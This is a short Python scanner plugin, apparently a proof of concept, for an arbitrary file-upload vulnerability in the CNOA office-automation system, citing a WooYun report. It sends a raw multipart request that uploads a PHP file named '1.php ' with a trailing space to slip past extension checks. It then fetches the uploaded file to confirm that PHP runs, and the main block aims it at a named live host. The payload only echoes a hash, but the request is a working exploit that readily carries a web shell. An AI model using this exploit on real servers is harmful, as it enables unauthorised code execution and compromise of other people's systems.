#!/usr/bin/env python
#-*- coding:utf-8 -*-
#ref:http://www.wooyun.org/bugs/wooyun-2010-073972

def assign(service, arg):
    if service == "cnoa":
        return True, arg

def audit(arg):
    payload = arg + 'index.php?action=upFile&act=upforhtmleditor'
    poc = '''POST /index.php?action=upFile&act=upforhtmleditor HTTP/1.1
Host: 127.0.0.1
Proxy-Connection: keep-alive
Content-Length: 412
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryw1mFOw5Peney0fTL
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
Cookie: CNOA_language=cn; CNOAOASESSID=6ve495u5aru635c3jr99v2u6u1

------WebKitFormBoundaryw1mFOw5Peney0fTL
Content-Disposition: form-data; name="Filedata"; filename="1.php "
Content-Type: application/x-x509-ca-cert

<?php
echo md5(1);
?>
------WebKitFormBoundaryw1mFOw5Peney0fTL
Content-Disposition: form-data; name="folder"

/
------WebKitFormBoundaryw1mFOw5Peney0fTL
Content-Disposition: form-data; name="submit"

Submit
------WebKitFormBoundaryw1mFOw5Peney0fTL--
'''
    code, head, res, errcode, _ = curl.curl2(payload,raw=poc)
    verify = arg+res
    code, head, res, errcode, _ = curl.curl2(verify)
    if code==200 and 'c4ca4238a0b923820dcc509a6f75849b' in res:
        security_hole("file uploaded:"+verify+"\r\nref:http://www.wooyun.org/bugs/wooyun-2010-073972")
if __name__ == '__main__':
    from dummy import *
    audit(assign('cnoa', 'http://tlrqa.cnoa.cn/')[1])